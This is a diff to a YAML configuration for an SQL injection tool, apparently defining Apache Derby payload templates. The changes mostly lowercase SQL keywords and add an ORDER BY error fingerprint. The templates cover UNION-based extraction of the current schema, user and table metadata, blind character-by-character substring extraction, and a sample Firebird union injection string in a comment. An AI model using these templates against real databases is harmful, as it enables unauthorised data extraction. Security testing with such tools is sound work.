@@ -1,13 +1,14 @@
 vendor: Derby
+# jdbc:derby://localhost:1527/E:\Dev\db-derby-10.11.1.1-bin\demo\databases\toursdb
 
 resource:
  info: |
-  SELECT
+  select
       '-'
       || '${enclose_value_sql}'
-      || CURRENT SCHEMA
+      || current schema
       || '${enclose_value_sql}'
-      || CURRENT_USER
+      || current_user
       || '${trail_sql}'
   from SYSIBM.SYSDUMMY1
 
@@ -15,7 +16,7 @@ resource:
   database: |
    /**
     * aggreg function return exec fault
-    * SELECT item_type FROM SALES where 1=0 union select list(rdb$relation_name,'a')from(select rdb$relation_name from rdb$relations ROWS 2 TO 2)-- 0x0000000100000000
+    * select item_type FROM SALES where 1=0 union select list(rdb$relation_name,'a')from(select rdb$relation_name from rdb$relations ROWS 2 TO 2)-- 0x0000000100000000
     * => use limit 1,1 instead
     */
    select
@@ -58,7 +59,7 @@ resource:
 
   row:
    query: |
-    SELECT
+    select
         '${enclose_value_sql}'
         || ${fields}
         || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
@@ -76,7 +77,7 @@ strategy:
         * If reach end of string (${lead}i) then NULLIF nullifies the result
         */
        '${lead}'
-       || NULLIF(
+       || nullif(
            substr(
                (${injection}),
                ${window.char}
@@ -84,7 +85,7 @@ strategy:
            '${trail_sql}'
        )
    from SYSIBM.SYSDUMMY1
-  limit: OFFSET ${limit.value} ROWS FETCH NEXT 1 ROWS ONLY
+  limit: offset ${limit.value} rows fetch next 1 rows only
   failsafe: |
    trim(
        cast(
@@ -98,6 +99,8 @@ strategy:
   fingerprint:
    errorMessage:
     - Derby database
+   orderByErrorMessage:
+    - Column position '1337' is out of range for the query expression
 
  normal:
   indices: union select ${indices} from SYSIBM.SYSDUMMY1
